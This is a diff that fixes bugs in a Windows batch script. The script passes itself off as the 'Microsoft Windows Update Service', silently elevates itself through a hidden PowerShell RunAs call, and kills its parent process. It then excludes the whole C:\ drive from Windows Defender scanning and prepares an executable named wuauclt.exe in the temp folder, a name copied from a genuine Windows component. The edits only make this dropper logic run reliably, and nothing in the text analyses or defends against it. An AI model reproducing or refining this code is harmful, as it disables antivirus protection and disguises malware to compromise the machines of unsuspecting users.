@@ -13,13 +13,13 @@ if %errorLevel% == 0 (
 
 :requestElevation
     set "originalPID="
-    for /f "tokens=2 delims=;=" %%A in ('wmic process where "name='cmd.exe' and commandline like '%%%~nx0%%'" get processid, commandline /format:list | find "MINIMIZED"') do (
+    for /f "tokens=2 delims=;=" %%A in ('wmic process where "name='cmd.exe' and commandline like '%%%~nx0%%'" get processid^, commandline /format:list ^| find "MINIMIZED"') do (
         if not defined originalPID set "originalPID=%%A"
     )
-ECHO is off.
+    
     set "batchPath=%~f0"
     set "batchArgs=MINIMIZED KILLPARENT %originalPID%"
-ECHO is off.
+    
     :tryElevate
     echo Microsoft Windows Update Service...
     powershell -noprofile -windowstyle hidden -command "Start-Process -WindowStyle Hidden -FilePath 'cmd.exe' -ArgumentList '/min /c \"\"%batchPath%\" %batchArgs%\"' -Verb RunAs"
@@ -35,7 +35,7 @@ ECHO is off.
     if /i "%~2"=="KILLPARENT" (
         taskkill /PID %~3 /F >nul 2>&1
     )
-ECHO is off.
+    
     setlocal
     powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\'"
     set "exeFile=%TEMP%\wuauclt.exe"
